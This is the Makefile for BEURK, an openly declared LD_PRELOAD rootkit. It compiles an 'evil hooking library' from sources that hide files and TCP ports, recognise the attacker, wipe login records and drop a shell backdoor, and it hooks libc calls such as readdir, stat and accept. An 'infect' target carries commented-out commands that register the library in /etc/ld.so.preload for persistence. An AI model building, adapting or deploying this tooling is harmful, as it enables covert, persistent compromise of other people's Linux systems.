# use bash as Makefile's shell
SHELL				:= /bin/bash

# set default config values (can be overidden by setting env vars)
BEURK_CONFIG_FILE	?= beurk.conf
BEURK_LIBRARY_NAME	?= $(shell sed -ne 's/^LIBRARY_NAME\s*=\s*//p' < $(BEURK_CONFIG_FILE))
BEURK_DEBUG_LEVEL	?= $(shell sed -ne 's/^DEBUG_LEVEL\s*=\s*//p' < $(BEURK_CONFIG_FILE))
BEURK_INSTALL_DIR	?= $(shell sed -ne 's/^INSTALL_DIR\s*=\s*//p' < $(BEURK_CONFIG_FILE))

# compiler options
INCLUDES	:= -Iincludes
CFLAGS		= $(INCLUDES) -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE
LDLIBS		:= -lc -ldl -lutil -lpam -lgcov

# take sources from /src and /src/hooks
SOURCES		= src/init.c \
			  src/config.c \
			  src/debug.c \
			  src/is_hidden_file.c \
			  src/is_attacker.c \
			  src/is_procnet.c \
			  src/hide_tcp_ports.c \
			  src/cleanup_login_records.c \
			  src/drop_shell_backdoor.c \
			  \
			  src/hooks/access.c \
			  src/hooks/rmdir.c \
			  src/hooks/fopen.c \
			  src/hooks/fopen64.c \
			  src/hooks/readdir.c \
			  src/hooks/readdir64.c \
			  src/hooks/lstat.c \
			  src/hooks/__lxstat.c \
			  src/hooks/lstat64.c \
			  src/hooks/__lxstat64.c \
			  src/hooks/open.c \
			  src/hooks/link.c \
			  src/hooks/unlink.c \
			  src/hooks/unlinkat.c \
			  src/hooks/stat.c \
			  src/hooks/__xstat.c \
			  src/hooks/stat64.c \
			  src/hooks/__xstat64.c \
			  src/hooks/accept.c
OBJECTS		= $(patsubst src/%.c, obj/%.o, $(SOURCES))
COVERAGE	= $(patsubst src/%.c, obj/%.gcda, $(SOURCES))

# make standard rule phony
.PHONY: all re clean distclean test coverage infect disinfect

# build separate objects
obj/%.o: $(addprefix src/, %.c)
	@mkdir -p `dirname $@`
	$(CC) $(CFLAGS) -fPIC -g -O0 -c $< -o $@

# include header dependencies (use make dep to generate this)
include Makefile.dep
dep: includes/config.h
	$(CC) $(INCLUDES) -MM $(SOURCES) > Makefile.dep

# build evil hooking library (not relink)
all: $(BEURK_LIBRARY_NAME)

# generate includes/config.h and src/config.c with builder
includes/config.h:
	./reconfigure $(BEURK_CONFIG_FILE)

$(BEURK_LIBRARY_NAME): includes/config.h $(OBJECTS)
	$(CC) -fPIC -shared -Wl,-soname,$(BEURK_LIBRARY_NAME) $(OBJECTS) \
		$(LDLIBS) -o $(BEURK_LIBRARY_NAME)
ifeq ($(BEURK_DEBUG_LEVEL), 0)
	strip --strip-unneeded -R .note -R .comment $(BEURK_LIBRARY_NAME)
endif

# run all tests with `make test`
test:
	./utils/run-tests.sh tests

# compile DSO with flags for code coverage
coverage: CFLAGS += -fprofile-arcs -ftest-coverage
coverage: BEURK_DEBUG_LEVEL=2
coverage: re
	echo $(BEURK_DEBUG_LEVEL)
	./utils/run-tests.sh tests/core/unit-tests
	gcov $(COVERAGE)

# infect current system with the rootkit
infect: $(BEURK_LIBRARY_NAME)
	@echo TODO ! && false
	#! test -e $(BEURK_INSTALL_DIR)/$(BEURK_LIBRARY_NAME)
	#cp $(BEURK_LIBRARY_NAME) $(BEURK_INSTALL_DIR)/
	#echo $(BEURK_INSTALL_DIR)/$(BEURK_LIBRARY_NAME) >> /etc/ld.so.preload

# uninstall the rootkit (if installed on current system)
disinfect:
	@echo TODO ! && false

# remove object files
clean:
	-$(RM) -r obj/

# remove object files and evil hooking library
distclean: clean
	-$(RM) $(BEURK_LIBRARY_NAME)
	-$(RM) src/config.c includes/config.h

# re build evil hooking library
re: distclean all
